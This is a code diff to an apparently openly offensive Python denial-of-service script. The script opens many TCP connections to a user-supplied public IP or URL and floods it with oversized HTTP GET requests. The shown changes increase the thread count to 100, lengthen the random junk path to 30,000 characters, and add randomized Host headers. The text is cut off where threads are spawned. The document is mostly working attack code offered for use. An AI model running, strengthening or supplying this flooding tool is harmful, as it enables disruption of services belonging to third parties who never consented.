@@ -6,39 +6,27 @@ import threading
 import time
 from urllib.parse import urlparse
 
-
-target_url = ""
-ip = ""
+target = ""
 port = 0
 num_requests = 0
 
-if len(sys.argv) == 3:
-    target_url = sys.argv[1]
-    port = 80
-    num_requests = int(sys.argv[2])
-elif len(sys.argv) == 4:
-    target_url = sys.argv[1]
+if len(sys.argv) == 4:
+    target = sys.argv[1]
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
 else:
-    print(f"ERROR: Invalid number of arguments\nUsage: {sys.argv[0]} <URL> <Port> <Number_of_Attacks>")
+    print(f"ERROR: Invalid number of arguments\nUsage: {sys.argv[0]} <Public_IP_or_URL> <Port> <Number_of_Attacks>")
     sys.exit(1)
 
-# extract host and port from the URL
-parsed_url = urlparse(target_url)
-host = parsed_url.netloc
-if ":" in host:
-    host, port = host.split(":")
-    port = int(port)
-
+# check if the target is an IP or a URL
 try:
-    ip = socket.gethostbyname(host)
+    target_ip = socket.gethostbyname(target)
 except socket.gaierror:
-    print(f"ERROR: Failed to resolve hostname: {host}")
-    sys.exit(2)
+    parsed_url = urlparse(target)
+    target_ip = socket.gethostbyname(parsed_url.netloc)
 
-# create a shared variable for thread counts
-thread_num = 20
+# set number of threads
+thread_num = 100
 thread_num_mutex = threading.Lock()
 
 def print_status():
@@ -52,30 +40,33 @@ def print_status():
     thread_num_mutex.release()
 
 # set payload size
-def generate_large_payload(size=19000):
+def generate_large_payload(size=30000):
     msg = "".join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(size))
     return msg
+
+def random_host():
+    # generate a random alphanumeric host name of length 10
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
 
 def attack():
     print_status()
     url_path = generate_large_payload()
 
-    # create a raw socket
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        dos.connect((ip, port))
+        dos.connect((target_ip, port))
 
-        # send the HTTP request according to spec
-        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
-        dos.send(byt)
+        custom_host_header = random_host() + ".com"
+        http_request = (f"GET /{url_path} HTTP/1.1\nHost: {custom_host_header}\n\n").encode()
+        dos.send(http_request)
     except socket.error as e:
         print(f"\nERROR: {str(e)}")
     finally:
         # close the socket to release the file descriptor (!!!)
         dos.close()
 
-print(f"[#] Attack started on {host} ({ip}) || Port: {str(port)} || # Requests: {str(num_requests)}")
+print(f"[#] Attack started on {target_ip} || Port: {str(port)} || # Requests: {str(num_requests)}")
 
 # spawn a thread per request
 all_threads = []
